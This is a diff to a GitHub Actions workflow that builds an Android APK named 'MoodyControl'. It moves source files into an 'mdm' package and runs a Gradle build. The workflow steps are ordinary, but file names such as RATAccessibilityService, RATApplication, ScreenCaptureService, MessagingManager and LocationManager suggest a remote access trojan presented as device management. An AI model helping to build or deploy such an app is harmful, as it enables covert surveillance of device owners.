@@ -8,13 +8,49 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+      
       - uses: actions/setup-java@v4
         with:
           java-version: '17'
           distribution: 'temurin'
+
       - uses: android-actions/setup-android@v3
-      - run: chmod +x gradlew
-      - run: ./gradlew assembleDebug --no-daemon
+
+      - name: Setup project structure
+        run: |
+          mkdir -p app/src/main/java/com/mycontrol/mdm/managers
+          mkdir -p app/src/main/java/com/mycontrol/mdm/services
+          mkdir -p app/src/main/java/com/mycontrol/mdm/utils
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          mv ActionManager.kt app/src/main/java/com/mycontrol/mdm/managers/
+          mv DeviceManager.kt app/src/main/java/com/mycontrol/mdm/managers/
+          mv FileManager.kt app/src/main/java/com/mycontrol/mdm/managers/
+          mv LocationManager.kt app/src/main/java/com/mycontrol/mdm/managers/
+          mv MediaManager.kt app/src/main/java/com/mycontrol/mdm/managers/
+          mv MessagingManager.kt app/src/main/java/com/mycontrol/mdm/managers/
+          mv WebSocketService.kt app/src/main/java/com/mycontrol/mdm/services/
+          mv BootReceiver.kt app/src/main/java/com/mycontrol/mdm/services/
+          mv RATAccessibilityService.kt app/src/main/java/com/mycontrol/mdm/services/
+          mv ScreenCaptureService.kt app/src/main/java/com/mycontrol/mdm/services/
+          mv DeviceUtils.kt app/src/main/java/com/mycontrol/mdm/utils/
+          mv Config.kt app/src/main/java/com/mycontrol/mdm/
+          mv RATApplication.kt app/src/main/java/com/mycontrol/mdm/
+          mv MainActivity.kt app/src/main/java/com/mycontrol/mdm/
+          mv AndroidManifest.xml app/src/main/
+          mv network_security_config.xml app/src/main/res/xml/
+          mv accessibility_service_config.xml app/src/main/res/xml/
+          mv strings.xml app/src/main/res/values/
+          mv styles.xml app/src/main/res/values/
+          mv proguard-rules.pro app/
+          echo "sdk.dir=$ANDROID_HOME" > local.properties
+          gradle wrapper --gradle-version=8.4
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleDebug --no-daemon
+
       - uses: actions/upload-artifact@v4
         with:
           name: MoodyControl-APK
